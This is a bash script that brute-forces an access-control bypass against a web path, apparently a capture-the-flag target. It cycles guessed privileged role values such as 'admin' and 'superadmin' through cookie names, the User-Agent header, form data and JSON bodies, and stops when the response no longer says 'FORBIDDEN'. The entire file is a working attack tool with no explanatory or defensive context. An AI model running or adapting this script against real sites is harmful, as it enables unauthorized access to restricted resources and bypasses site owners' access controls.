#!/bin/bash

users=("admin" "adminuser" "administrator" "superuser" "unlimiteduser" "superadmin" "websecnepal" "websectech" "uranium238" "hacker" "secret" "wall" "Good Wall" "Burkina Faso")
key=("USERROLE" "ROLE" "ADMINROLE" "USER" "PHPSESSID" "userrole" "role" "adminrole" "user")
url="http://webseccdn.tech/secret/"
found="n"

check_forbidden() {
    if grep "FORBIDDEN" <<< "${1}" > /dev/null 2>&1; then
        return 1
    else
        return 0
    fi
}

for k in "${key[@]}"; do
    for u in "${users[@]}"; do
        echo -e "\ntrying with ${k}:${u}"

        echo "Trying with cookie"
        result=$(curl -sS "${url}" --cookie "${k}=${u}")
        if check_forbidden $result; then
            echo -e "\nResult is: ${result}\n"
            found="y"
            break
        fi

        echo "Trying with user agent"
        result=$(curl -sS "${url}" -A "${u}")
        if check_forbidden $result; then
            echo -e "\nResult is: ${result}\n"
            found="y"
            break
        fi

        echo "Trying with payload"
        result=$(curl -sS "${url}" -d "${k}=${u}")
        if check_forbidden $result; then
            echo -e "\nResult is: ${result}\n"
            found="y"
            break
        fi

        echo "Trying with json"
        result=$(curl -sS "${url}" -H "Content-Type: application/json" -d "{\"${k}\": \"${u}\"}")
        if check_forbidden $result; then
            echo -e "\nResult is: ${result}\n"
            found="y"
            break
        fi
    done

    if [[ "${found}" == "y" ]]; then
        break
    fi
done